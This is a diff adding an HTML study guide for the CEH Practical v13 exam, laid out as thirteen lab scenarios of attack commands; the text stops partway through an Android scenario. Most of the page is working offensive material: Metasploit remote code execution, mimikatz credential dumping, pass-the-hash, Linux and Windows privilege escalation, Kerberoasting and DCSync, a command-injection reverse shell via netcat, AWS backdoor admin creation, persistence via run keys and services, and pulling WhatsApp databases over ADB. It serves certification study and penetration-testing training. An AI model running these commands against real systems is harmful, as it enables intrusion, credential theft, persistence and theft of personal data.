@@ -1,0 +1,1319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CEH Practical v13 Study Guide</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            color: #e0e0e0;
+            line-height: 1.6;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: rgba(20, 20, 20, 0.95);
+            border: 2px solid #333;
+            box-shadow: 0 0 40px rgba(0, 0, 0, 0.8), inset 0 0 20px rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(90deg, #1a1a1a 0%, #2a2a2a 100%);
+            padding: 30px;
+            border-bottom: 3px solid #444;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 2em;
+            color: #fff;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
+        }
+
+        .subtitle {
+            color: #999;
+            font-size: 0.9em;
+            letter-spacing: 1px;
+        }
+
+        .content {
+            padding: 40px;
+        }
+
+        h2 {
+            color: #fff;
+            font-size: 1.5em;
+            margin: 30px 0 15px 0;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #333;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        h3 {
+            color: #ccc;
+            font-size: 1.2em;
+            margin: 25px 0 10px 0;
+            letter-spacing: 1px;
+        }
+
+        p {
+            margin-bottom: 15px;
+            color: #b0b0b0;
+        }
+
+        .emphasis {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 20px;
+            border-left: 4px solid #555;
+            margin: 20px 0;
+            font-weight: bold;
+            color: #fff;
+        }
+
+        ul {
+            list-style: none;
+            margin: 15px 0;
+        }
+
+        ul li {
+            padding: 8px 0 8px 30px;
+            position: relative;
+            color: #b0b0b0;
+        }
+
+        ul li:before {
+            content: "▸";
+            position: absolute;
+            left: 10px;
+            color: #666;
+            font-size: 1.2em;
+        }
+
+        .scenario {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid #2a2a2a;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+
+        .scenario h4 {
+            color: #fff;
+            margin-bottom: 10px;
+            font-size: 1.1em;
+        }
+
+        .task {
+            background: rgba(255, 255, 255, 0.03);
+            padding: 15px;
+            border-left: 3px solid #444;
+            margin: 10px 0;
+            font-style: italic;
+            color: #aaa;
+        }
+
+        .command-block {
+            background: #000;
+            border: 1px solid #333;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+        }
+
+        .command-block pre {
+            color: #0f0;
+            margin: 5px 0;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        .command-title {
+            color: #888;
+            font-size: 0.85em;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+
+        .tools {
+            color: #888;
+            font-size: 0.95em;
+        }
+
+        code {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 2px 6px;
+            border-radius: 3px;
+            color: #ddd;
+            font-family: 'Courier New', monospace;
+        }
+
+        .resource-box {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid #2a2a2a;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 4px;
+        }
+
+        .resource-box h4 {
+            color: #ccc;
+            margin-bottom: 8px;
+        }
+
+        .footer {
+            background: #1a1a1a;
+            padding: 20px;
+            text-align: center;
+            border-top: 2px solid #333;
+            color: #666;
+            font-size: 0.85em;
+        }
+
+        .ip-address {
+            color: #0ff;
+            font-weight: bold;
+        }
+
+        @media (max-width: 768px) {
+            .content {
+                padding: 20px;
+            }
+            
+            h1 {
+                font-size: 1.5em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>CEH Practical v13</h1>
+            <div class="subtitle">Study Guide & Preparation Framework</div>
+        </div>
+
+        <div class="content">
+            <div class="emphasis">
+                Core Principle: This guide does not provide actual exam questions or answers from the official EC-Council CEH Practical v13 exam. All content respects copyright and academic integrity.
+            </div>
+
+            <h2>What This Guide Provides</h2>
+            <ul>
+                <li>Explanation of CEH v13 Practical Exam Format & Key Changes</li>
+                <li>Updated, Generic Practice Examples with Real Commands</li>
+                <li>Legitimate Study Resources List</li>
+                <li>Underlying Methodologies & Concepts</li>
+            </ul>
+
+            <h2>Focus on CEH Practical v13</h2>
+            <p>The v12 exam is retired. CEH v13 places stronger emphasis on modern attack vectors:</p>
+            <ul>
+                <li>Cloud Security (AWS, Azure)</li>
+                <li>OT/IoT Security</li>
+                <li>WPA3 Penetration Testing</li>
+                <li>API Security</li>
+                <li>Automated Vulnerability Analysis</li>
+                <li>Expanded Malware Analysis</li>
+                <li>Bypassing Modern Security Controls</li>
+            </ul>
+
+            <h2>Legal Practice Scenarios for v13</h2>
+            <p>These are generic examples designed to mimic exam objectives. <strong>These are NOT actual exam questions.</strong></p>
+
+            <div class="scenario">
+                <h4>Scenario 1: Web Application Recon & Exploitation</h4>
+                <div class="task">
+                    Task: "Target IP: <span class="ip-address">10.10.10.150</span>. Perform comprehensive reconnaissance to identify all web applications and services. Exploit a known vulnerability to gain initial access."
+                </div>
+                
+                <div class="command-block">
+                    <div class="command-title">Step 1: Port Scanning</div>
+                    <pre>nmap -sV -sC -p- -T4 10.10.10.150 -oN scan.txt</pre>
+                    <pre>nmap --script=http-enum 10.10.10.150</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 2: Directory Brute-forcing</div>
+                    <pre>gobuster dir -u http://10.10.10.150 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt</pre>
+                    <pre>dirb http://10.10.10.150 /usr/share/wordlists/dirb/big.txt</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 3: Vulnerability Scanning</div>
+                    <pre>nikto -h http://10.10.10.150</pre>
+                    <pre>nuclei -u http://10.10.10.150 -t cves/</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 4: Exploit Search & Execution</div>
+                    <pre>searchsploit apache 2.4.49</pre>
+                    <pre>msfconsole
+use exploit/multi/http/apache_normalize_path_rce
+set RHOSTS 10.10.10.150
+set LHOST 10.10.14.5
+exploit</pre>
+                </div>
+            </div>
+
+            <div class="scenario">
+                <h4>Scenario 2: Password Cracking & Privilege Escalation</h4>
+                <div class="task">
+                    Task: "Target Windows machine: <span class="ip-address">192.168.1.100</span>. You have a low-privilege shell. Dump password hashes, crack the administrator password, and escalate to SYSTEM."
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 1: Dump Hashes with Mimikatz</div>
+                    <pre>mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+lsadump::sam</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 2: Extract Hashes</div>
+                    <pre># Save hash to file
+echo "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::" > hash.txt</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 3: Crack with Hashcat</div>
+                    <pre>hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt --force</pre>
+                    <pre># Or with John the Ripper
+john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 4: Pass-the-Hash (if cracking fails)</div>
+                    <pre>pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 //192.168.1.100 cmd</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 5: Privilege Escalation Check</div>
+                    <pre># Check for unquoted service paths
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
+
+# Token impersonation
+.\PrintSpoofer.exe -i -c cmd</pre>
+                </div>
+            </div>
+
+            <div class="scenario">
+                <h4>Scenario 3: Network Sniffing & Traffic Analysis</h4>
+                <div class="task">
+                    Task: "Analyze the provided PCAP file. Identify attacker IP, compromised machine IP (<span class="ip-address">172.16.0.50</span>), exfiltrated data, and exfiltration protocol."
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 1: Open PCAP in Wireshark</div>
+                    <pre>wireshark capture.pcap</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 2: Wireshark Display Filters</div>
+                    <pre># Find HTTP traffic
+http
+
+# Find DNS queries
+dns
+
+# Find specific IP conversations
+ip.addr == 172.16.0.50
+
+# Find suspicious ports
+tcp.port == 4444 || tcp.port == 1234
+
+# Find FTP data transfers
+ftp-data</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 3: Follow TCP Streams</div>
+                    <pre># Right-click packet → Follow → TCP Stream
+# Look for Base64 encoded data, credentials, or file transfers</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 4: Extract Files from PCAP</div>
+                    <pre># In Wireshark: File → Export Objects → HTTP/SMB/FTP
+# Or use tshark
+tshark -r capture.pcap --export-objects http,exported_files/</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 5: DNS Tunneling Detection</div>
+                    <pre># Filter for suspicious DNS queries
+dns.qry.name contains "attacker.com"
+
+# Check for long DNS queries (data exfil)
+dns and frame.len > 100</pre>
+                </div>
+            </div>
+
+            <div class="scenario">
+                <h4>Scenario 4: SQL Injection Attack</h4>
+                <div class="task">
+                    Task: "Web application at <span class="ip-address">10.10.10.75</span>. Find and exploit SQL injection vulnerability to extract database information."
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 1: Manual SQLi Testing</div>
+                    <pre># Test for SQLi
+http://10.10.10.75/login.php?id=1'
+http://10.10.10.75/login.php?id=1' OR '1'='1
+http://10.10.10.75/login.php?id=1' UNION SELECT NULL--</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 2: SQLMap Automated Exploitation</div>
+                    <pre>sqlmap -u "http://10.10.10.75/login.php?id=1" --dbs
+sqlmap -u "http://10.10.10.75/login.php?id=1" -D database_name --tables
+sqlmap -u "http://10.10.10.75/login.php?id=1" -D database_name -T users --dump
+sqlmap -u "http://10.10.10.75/login.php?id=1" --os-shell</pre>
+                </div>
+            </div>
+
+            <div class="scenario">
+                <h4>Scenario 5: Wireless Network Penetration</h4>
+                <div class="task">
+                    Task: "Target wireless network SSID: 'CorporateWiFi'. Capture WPA3/WPA2 handshake and crack the password."
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 1: Enable Monitor Mode</div>
+                    <pre>airmon-ng check kill
+airmon-ng start wlan0</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 2: Scan for Networks</div>
+                    <pre>airodump-ng wlan0mon</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 3: Capture Handshake</div>
+                    <pre>airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+# In new terminal, deauth clients
+aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 4: Crack with Aircrack-ng</div>
+                    <pre>aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 5: WPA3 Attack (Dragonblood)</div>
+                    <pre>wpa_sycophant -c wpa_sycophant.conf -i wlan0mon</pre>
+                </div>
+            </div>
+
+            <div class="scenario">
+                <h4>Scenario 6: Linux Privilege Escalation</h4>
+                <div class="task">
+                    Task: "Target Linux server: <span class="ip-address">10.10.11.200</span>. You have SSH access as user 'bob'. Escalate privileges to root."
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 1: System Enumeration</div>
+                    <pre>id
+uname -a
+sudo -l
+cat /etc/cron*
+find / -perm -4000 2>/dev/null
+cat /etc/passwd</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 2: LinPEAS Automated Check</div>
+                    <pre># Download and run
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Or upload from attacker machine
+python3 -m http.server 8000
+# On target:
+wget http://10.10.14.5:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 3: SUID Binary Exploitation</div>
+                    <pre># Find SUID binaries
+find / -perm -4000 -type f 2>/dev/null
+
+# Example: /usr/bin/find is SUID
+/usr/bin/find . -exec /bin/sh -p \; -quit
+
+# Example: /usr/bin/vim.basic
+/usr/bin/vim.basic -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 4: Sudo Exploitation (GTFOBins)</div>
+                    <pre># If user can run specific commands with sudo
+sudo -l
+# Output: (ALL) NOPASSWD: /usr/bin/python
+
+sudo python -c 'import os; os.system("/bin/bash")'</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 5: Kernel Exploit</div>
+                    <pre># Check kernel version
+uname -r
+
+# Search for exploit
+searchsploit linux kernel 4.15
+
+# Compile and run (example: DirtyCow)
+gcc -pthread dirty.c -o dirty -lcrypt
+./dirty password</pre>
+                </div>
+            </div>
+
+            <div class="scenario">
+                <h4>Scenario 7: Active Directory Enumeration & Attack</h4>
+                <div class="task">
+                    Task: "Domain Controller: <span class="ip-address">192.168.10.10</span>. Domain: CORP.LOCAL. Enumerate AD, perform Kerberoasting, and gain Domain Admin."
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 1: Domain Enumeration with BloodHound</div>
+                    <pre># From Linux attacker (10.10.14.5)
+bloodhound-python -d corp.local -u john -p 'Password123' -ns 192.168.10.10 -c all
+
+# From Windows with PowerView
+powershell -ep bypass
+Import-Module .\PowerView.ps1
+Get-NetDomain
+Get-NetDomainController
+Get-NetUser | select cn,samaccountname
+Get-NetGroup "Domain Admins"</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 2: Kerberoasting Attack</div>
+                    <pre># Request service tickets
+Invoke-Kerberoast -OutputFormat Hashcat | fl
+
+# Or with Impacket
+GetUserSPNs.py corp.local/john:'Password123' -dc-ip 192.168.10.10 -request
+
+# Crack the tickets
+hashcat -m 13100 kerberos.hash /usr/share/wordlists/rockyou.txt --force</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 3: AS-REP Roasting</div>
+                    <pre># Find users with "Do not require Kerberos preauthentication"
+GetNPUsers.py corp.local/ -dc-ip 192.168.10.10 -request
+
+# Crack
+hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 4: Pass-the-Hash Attack</div>
+                    <pre># With valid NTLM hash
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42 //192.168.10.10 cmd
+
+# Or with CrackMapExec
+crackmapexec smb 192.168.10.10 -u Administrator -H e19ccf75ee54e06b06a5907af13cef42</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 5: DCSync Attack</div>
+                    <pre># Dump all domain hashes
+mimikatz.exe
+lsadump::dcsync /domain:corp.local /all /csv
+
+# Or with Impacket
+secretsdump.py corp.local/administrator@192.168.10.10</pre>
+                </div>
+            </div>
+
+            <div class="scenario">
+                <h4>Scenario 8: Malware Analysis</h4>
+                <div class="task">
+                    Task: "Suspicious file 'invoice.exe' found on <span class="ip-address">10.10.50.100</span>. Analyze the malware, identify C2 server, and extract IOCs."
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 1: Static Analysis</div>
+                    <pre># Get file hash
+md5sum invoice.exe
+sha256sum invoice.exe
+
+# Check VirusTotal
+# Upload to virustotal.com or use API
+
+# Strings analysis
+strings invoice.exe | grep -E "http|IP|\.exe|\.dll"
+strings invoice.exe | grep -i "password\|user\|admin"</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 2: PE Analysis</div>
+                    <pre># View PE headers
+pecheck.py invoice.exe
+pefile invoice.exe
+
+# Check for packing
+upx -d invoice.exe
+
+# Analyze with PEStudio
+pestudio.exe invoice.exe</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 3: Dynamic Analysis (Sandbox)</div>
+                    <pre># Use inetsim for fake internet
+inetsim
+
+# Monitor with procmon (Windows)
+procmon.exe /AcceptEula /BackingFile output.pml
+
+# Network monitoring
+wireshark &
+# Run malware in isolated VM</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 4: Extract Network IOCs</div>
+                    <pre># DNS queries made
+tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | sort -u
+
+# IP connections
+tshark -r capture.pcap -Y "tcp.flags.syn==1 and tcp.flags.ack==0" -T fields -e ip.dst | sort -u
+
+# HTTP User-Agent
+tshark -r capture.pcap -Y "http.request" -T fields -e http.user_agent | sort -u</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 5: Memory Dump Analysis</div>
+                    <pre># Capture memory dump
+procdump -ma invoice.exe memory.dmp
+
+# Analyze with Volatility
+volatility -f memory.dmp imageinfo
+volatility -f memory.dmp --profile=Win10x64 pslist
+volatility -f memory.dmp --profile=Win10x64 netscan
+volatility -f memory.dmp --profile=Win10x64 malfind</pre>
+                </div>
+            </div>
+
+            <div class="scenario">
+                <h4>Scenario 9: API Security Testing</h4>
+                <div class="task">
+                    Task: "REST API endpoint at <span class="ip-address">https://10.10.20.50/api/v1</span>. Test for vulnerabilities and exploit authentication bypass."
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 1: API Enumeration</div>
+                    <pre># Discover endpoints
+curl https://10.10.20.50/api/v1/
+ffuf -w /usr/share/wordlists/api-endpoints.txt -u https://10.10.20.50/api/v1/FUZZ
+
+# Check for Swagger/OpenAPI docs
+curl https://10.10.20.50/api/v1/swagger.json
+curl https://10.10.20.50/api/docs</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 2: Authentication Testing</div>
+                    <pre># Test JWT manipulation
+# Decode JWT token
+echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d
+
+# Try "none" algorithm
+# Change "alg": "HS256" to "alg": "none" and remove signature
+
+# Test with burp suite or curl
+curl -X GET https://10.10.20.50/api/v1/users -H "Authorization: Bearer MODIFIED_TOKEN"</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 3: IDOR Testing</div>
+                    <pre># Test object reference
+curl https://10.10.20.50/api/v1/user/1 -H "Authorization: Bearer TOKEN"
+curl https://10.10.20.50/api/v1/user/2 -H "Authorization: Bearer TOKEN"
+curl https://10.10.20.50/api/v1/user/admin -H "Authorization: Bearer TOKEN"</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 4: Mass Assignment</div>
+                    <pre># Try adding admin parameters
+curl -X POST https://10.10.20.50/api/v1/register \
+  -H "Content-Type: application/json" \
+  -d '{"username":"hacker","password":"pass123","isAdmin":true,"role":"admin"}'</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 5: Rate Limiting & Fuzzing</div>
+                    <pre># Test rate limiting
+for i in {1..1000}; do curl https://10.10.20.50/api/v1/login -d "user=admin&pass=$i"; done
+
+# Fuzz with wfuzz
+wfuzz -w /usr/share/wordlists/big.txt -u https://10.10.20.50/api/v1/FUZZ --hc 404</pre>
+                </div>
+            </div>
+
+            <div class="scenario">
+                <h4>Scenario 10: IoT/OT Device Exploitation</h4>
+                <div class="task">
+                    Task: "IoT camera at <span class="ip-address">192.168.50.200</span>. Identify firmware vulnerabilities and gain root access to the device."
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 1: Device Reconnaissance</div>
+                    <pre>nmap -sV -p- 192.168.50.200
+nmap --script=rtsp-url-brute 192.168.50.200
+nmap --script=http-methods 192.168.50.200</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 2: Web Interface Exploitation</div>
+                    <pre># Default credentials
+curl http://192.168.50.200 -u admin:admin
+curl http://192.168.50.200 -u admin:12345
+
+# Check for CVEs
+searchsploit IP Camera
+searchsploit Hikvision</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 3: Firmware Download & Analysis</div>
+                    <pre># Download firmware
+wget http://192.168.50.200/firmware.bin
+
+# Extract firmware
+binwalk -e firmware.bin
+cd _firmware.bin.extracted
+
+# Find hardcoded credentials
+grep -r "password\|admin\|root" .
+strings squashfs-root/bin/* | grep -i "pass"</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 4: RTSP Stream Access</div>
+                    <pre># Access video stream
+vlc rtsp://admin:password@192.168.50.200:554/stream1
+
+# Test with ffmpeg
+ffmpeg -i rtsp://192.168.50.200:554/stream1 -frames:v 1 output.jpg</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 5: Command Injection</div>
+                    <pre># Test for command injection in CGI scripts
+curl "http://192.168.50.200/cgi-bin/config.cgi?action=test;id"
+curl "http://192.168.50.200/cgi-bin/config.cgi?action=test;cat%20/etc/passwd"
+
+# Reverse shell
+curl "http://192.168.50.200/cgi-bin/config.cgi?action=;nc%20-e%20/bin/sh%2010.10.14.5%204444"</pre>
+                </div>
+            </div>
+
+            <div class="scenario">
+                <h4>Scenario 11: Cloud Security - AWS Exploitation</h4>
+                <div class="task">
+                    Task: "AWS credentials found. Access Key: AKIAIOSFODNN7EXAMPLE. Enumerate AWS resources and escalate privileges."
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 1: Configure AWS CLI</div>
+                    <pre>aws configure
+# Enter Access Key ID: AKIAIOSFODNN7EXAMPLE
+# Enter Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+
+# Verify identity
+aws sts get-caller-identity</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 2: Enumerate Permissions</div>
+                    <pre># List IAM policies
+aws iam list-attached-user-policies --user-name compromised-user
+aws iam get-policy-version --policy-arn arn:aws:iam::123456789:policy/Policy --version-id v1
+
+# Enumerate resources
+aws s3 ls
+aws ec2 describe-instances
+aws rds describe-db-instances
+aws lambda list-functions</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 3: S3 Bucket Exploitation</div>
+                    <pre># List bucket contents
+aws s3 ls s3://company-backups/
+
+# Download sensitive files
+aws s3 cp s3://company-backups/database-backup.sql .
+aws s3 sync s3://company-backups/ ./local-copy/
+
+# Check for public buckets
+aws s3api get-bucket-acl --bucket company-backups</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 4: EC2 Instance Compromise</div>
+                    <pre># Get instance metadata
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Create SSH key and add to instance
+aws ec2 create-key-pair --key-name attacker-key --query 'KeyMaterial' --output text > attacker-key.pem
+chmod 400 attacker-key.pem
+
+# Modify security group
+aws ec2 authorize-security-group-ingress --group-id sg-12345678 --protocol tcp --port 22 --cidr 0.0.0.0/0</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 5: Privilege Escalation</div>
+                    <pre># Create new admin user
+aws iam create-user --user-name backdoor-admin
+aws iam attach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+aws iam create-access-key --user-name backdoor-admin
+
+# Or attach policies to existing user
+aws iam attach-user-policy --user-name compromised-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess</pre>
+                </div>
+            </div>
+
+            <div class="scenario">
+                <h4>Scenario 12: Post-Exploitation & Lateral Movement</h4>
+                <div class="task">
+                    Task: "Initial access on <span class="ip-address">10.10.30.100</span>. Establish persistence, pivot to internal network (<span class="ip-address">172.16.0.0/24</span>), and move laterally."
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 1: Establish Persistence (Windows)</div>
+                    <pre># Registry run key
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"
+
+# Scheduled task
+schtasks /create /sc onlogon /tn "WindowsUpdate" /tr "C:\backdoor.exe"
+
+# Service creation
+sc create "WindowsService" binPath= "C:\backdoor.exe" start= auto
+sc start WindowsService</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 2: Network Discovery</div>
+                    <pre># Internal network scan
+for /L %i in (1,1,254) do @ping -n 1 -w 100 172.16.0.%i | find "Reply"
+
+# Or with PowerShell
+1..254 | % {"172.16.0.$_: $(Test-Connection -count 1 -comp 172.16.0.$_ -quiet)"}
+
+# Port scan from compromised host
+nmap -sn 172.16.0.0/24
+nmap -p 445,3389,22,80 172.16.0.0/24</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 3: Credential Harvesting</div>
+                    <pre># Dump credentials
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
+# Search for credentials in files
+findstr /si password *.txt *.ini *.config
+dir /s *password* == *.config</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 4: Pivoting with Port Forwarding</div>
+                    <pre># SSH tunneling
+ssh -L 8080:172.16.0.50:80 user@10.10.30.100
+
+# Metasploit pivot
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set SRVPORT 1080
+run
+
+# Configure proxychains
+echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf
+proxychains nmap -sT 172.16.0.50</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 5: Lateral Movement with PSExec</div>
+                    <pre># Using PsExec
+psexec.py domain/user:password@172.16.0.50
+
+# Using WMI
+wmiexec.py domain/user:password@172.16.0.50
+
+# Using CrackMapExec
+crackmapexec smb 172.16.0.0/24 -u administrator -p 'Password123' -x "whoami"
+crackmapexec smb 172.16.0.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42</pre>
+                </div>
+            </div>
+
+            <div class="scenario">
+                <h4>Scenario 13: Android Device Exploitation via ADB</h4>
+                <div class="task">
+                    Task: "Android device at <span class="ip-address">192.168.1.150:5555</span>. Connect via ADB, extract sensitive files, and dump credentials from the device."
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 1: Connect to ADB over Network</div>
+                    <pre># Connect to remote ADB
+adb connect 192.168.1.150:5555
+
+# Verify connection
+adb devices
+
+# Or if USB connected first
+adb tcpip 5555
+adb connect 192.168.1.150:5555</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 2: Device Enumeration</div>
+                    <pre># Get device info
+adb shell getprop ro.build.version.release
+adb shell getprop ro.product.model
+adb shell id
+adb shell ps
+
+# List installed packages
+adb shell pm list packages
+adb shell pm list packages | grep -i bank
+adb shell pm list packages | grep -i password</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 3: File System Exploration</div>
+                    <pre># Navigate and explore
+adb shell
+cd /sdcard
+ls -la
+
+# Find sensitive files
+find /sdcard -name "*.db" 2>/dev/null
+find /sdcard -name "*.txt" 2>/dev/null
+find /sdcard -name "*password*" 2>/dev/null
+find /data/data -name "*.db" 2>/dev/null</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 4: Pull Files to Attacker Machine</div>
+                    <pre># Pull specific file
+adb pull /sdcard/credentials.txt ./
+adb pull /sdcard/Download/backup.db ./
+
+# Pull entire directory
+adb pull /sdcard/DCIM/Camera ./camera_photos/
+
+# Pull app data (requires root)
+adb pull /data/data/com.company.app/databases/userdata.db ./
+
+# Pull multiple files
+adb pull /data/data/com.whatsapp/databases/msgstore.db ./
+adb pull /data/data/com.whatsapp/databases/wa.db ./</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 5: Extract APK and Decompile</div>
+                    <pre># Find APK path
+adb shell pm path com.target.app
+
+# Pull APK
+adb pull /data/app/com.target.app-1/base.apk ./target.apk
+
+# Decompile with apktool
+apktool d target.apk
+
+# Search for hardcoded credentials
+grep -r "password" target/
+grep -r "api_key" target/
+grep -r "http" target/res/values/strings.xml</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 6: Dump SQLite Databases</div>
+                    <pre># Access database
+adb shell
+cd /data/data/com.target.app/databases/
+sqlite3 userdata.db
+
+# SQLite commands
+.tables
+.schema users
+SELECT * FROM users;
+SELECT username,password FROM users;
+.dump
+.exit
+
+# Or pull and analyze locally
+adb pull /data/data/com.target.app/databases/userdata.db ./
+sqlite3 userdata.db "SELECT * FROM users;"</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 7: Extract Backup and Analyze</div>
+                    <pre># Create full backup
+adb backup -apk -shared -all -f backup.ab
+
+# Convert .ab to .tar
+dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar
+tar -xvf backup.tar
+
+# Or use Android Backup Extractor
+java -jar abe.jar unpack backup.ab backup.tar</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 8: Screen Capture & Keylogging</div>
+                    <pre># Take screenshot
+adb shell screencap -p /sdcard/screen.png
+adb pull /sdcard/screen.png ./
+
+# Record screen
